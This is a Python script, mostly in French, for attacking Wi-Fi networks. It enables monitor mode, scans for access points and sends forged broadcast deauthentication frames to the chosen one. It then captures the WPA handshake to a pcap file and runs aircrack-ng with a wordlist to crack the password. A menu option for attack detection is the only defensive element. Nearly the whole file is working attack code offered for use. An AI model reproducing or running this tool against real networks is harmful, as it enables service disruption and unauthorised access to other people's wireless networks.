import time
import threading

import scapy.all as scapy
from scapy.utils import PcapWriter
import os
import sys
import Detection

from_frames = 0
to_frames = 0
beacon = 0
pcaphandshake = ""
accespoint =[]
accespointaddr =[]
poitdaccesselectionner = ""
essid=""
modemoniteur = False
TRED = '\033[31m'
TGREEN =  '\033[32m'
TWHITE = '\033[37m'


class pointacces : #Class for acces point
    def __init__(self, mac, ssid, can):
        self.mac = mac
        self.ssid = ssid
        self.can = can

def activermodemoniteur(): #Enable monitor mode
    os.system("sudo service NetworkManager stop")
    os.system("sudo ifconfig wlan0 down")
    os.system("sudo ip link set wlan0 name wlan0mon")
    os.system("iwconfig wlan0mon mode monitor")
    os.system("sudo ifconfig wlan0mon up")
    print("Mode moniteur activer")

def desactivermodemoniteur(): #Desable monitor mode
    os.system("sudo service NetworkManager start")
    os.system("sudo ifconfig wlan0mon down")
    os.system("iwconfig wlan0mon mode managed")
    os.system("sudo ip link set wlan0mon name wlan0")
    os.system("sudo ifconfig wlan0 up")
    print("Mode moniteur desactiver")



def changechanel() : #Change canal every 0.5second, if we don't do that scanner will not scan all the wifi
    global canal
    canal= 1
    while deadthread :
        os.system("iwconfig wlan0mon channel " + str(canal) )
        canal = canal % 11 +1
        time.sleep(0.5)




def Gerer_Paquet(p) : #Filters the packets of the AfficherAccesP method which takes care of sniffer to detect access points
    if p.addr2 not in accespointaddr and p.type == 0 :
        ap = pointacces(str(p.addr2),p.info.decode('utf8'), str(p.channel))
        accespointaddr.append(p.addr2)
        accespoint.append(ap)
        print(TWHITE+"["+str(len(accespoint)-1)+"]"+str(p.addr2) +" "+ p.info.decode('utf8')  )


def AfficherAccesP():
    print(TRED+"Ctrl+c : pour arreter la detection de point d'acces")
    scapy.sniff(iface="wlan0mon", prn=Gerer_Paquet)
    print("\n")
    print(TRED+"Choisir l'AP à attaquer : ")
    numero = input()
    return accespointaddr[int(numero)]


def deauthattaque(adressemac): #Deauth attack
    target_mac = "ff:ff:ff:ff:ff:ff"
    gateway_mac = adressemac
    dot11 = scapy.Dot11(type=0, subtype=12,addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = scapy.RadioTap() / dot11 / scapy.Dot11Deauth(reason=7)
    scapy.sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose= 1)


nombreeapol = 0

def HandshakeObtenue(p): #Filters the packets of the Sniffer() method to be able to write the packets of the 4 way handshale to a pcap file
    global from_frames
    global to_frames
    global ap_filter
    global beacon
    global nombreeapol
    pktdump =  PcapWriter(pcaphandshake,append=True,sync=True)
    positionnersurcanal(poitdaccesselectionner)
    if beacon == 0 and scapy.EAPOL not in p and p.addr2 == poitdaccesselectionner and p.subtype ==8:
        pktdump.write(p)

    if scapy.EAPOL in p :
        pktdump.write(p)
    else:
        return False



def sniffer(): #Sniff to be able to retrieve the packets for the handshake
    positionnersurcanal(poitdaccesselectionner)
    print(TRED+"Capture de handshake en cours, veuillez patienter 30 secondes")
    p = scapy.sniff(iface="wlan0mon", stop_filter = HandshakeObtenue, timeout = 30)

def CrackMDP(): #Crack the password using aircrack-ng
    print(essid)
    CheminDictionnaire = ""

    while not os.path.exists(CheminDictionnaire) :
        print(TWHITE+"Donner le chemin du dictionnaire")
        CheminDictionnaire = input()

    os.system("aircrack-ng "+pcaphandshake+" -w " + CheminDictionnaire)


def positionnersurcanal(adressemac) :
    global essid
    for obj in accespoint:
        if obj.mac == adressemac:
            essid = str(obj.ssid)
            os.system("iwconfig wlan0mon channel " + str(obj.can))





if __name__ == '__main__':
    print("Tacher d'installer aircrack-ng, scappy avant d'executer le programme")
    while not modemoniteur :
        print(TRED+"Le mode moniteur doit etre activer, si vous voulez l'activer taper o")
        choixutilisateur = input()
        if choixutilisateur == "o" :
            modemoniteur = True

    if modemoniteur == True :
        try:
            activermodemoniteur()
        except :
            pass
    print("\n")
    choix = -15
    while choix != str(1) and choix != str(2):
        print(TGREEN+"[1] Detecter un point d'acces pour une attaque"
          "\n[2] Detecteur d'attaque")
        choix = input()
        print("\n")

    if choix == str(1) :
        global deadthread
        deadthread = True

        T1 = threading.Thread(target=changechanel)
        T1.deamon = True
        T1.start()

        poitdaccesselectionner = AfficherAccesP()
        print("\n")
        deadthread = False

        print(TGREEN+"[1] Capture de Handshake + brute force attack"
              "\n[2] Deauth attack")
        choix2 = input()

        if choix2 == str(1):
            print(TRED+"Donner nom du fichier pcap")
            pcaphandshake = input() + ".pcap"
            print("\n")

            positionnersurcanal(poitdaccesselectionner)
            print(TRED+"\n Deauth attaque en cours")
            deauthattaque(poitdaccesselectionner)

            sniffer()
            CrackMDP()
        elif choix2 == str(2):
            deauthattaque(poitdaccesselectionner)
    elif choix == str(2) :
        Detection.sniffer()

    desactivermodemoniteur()








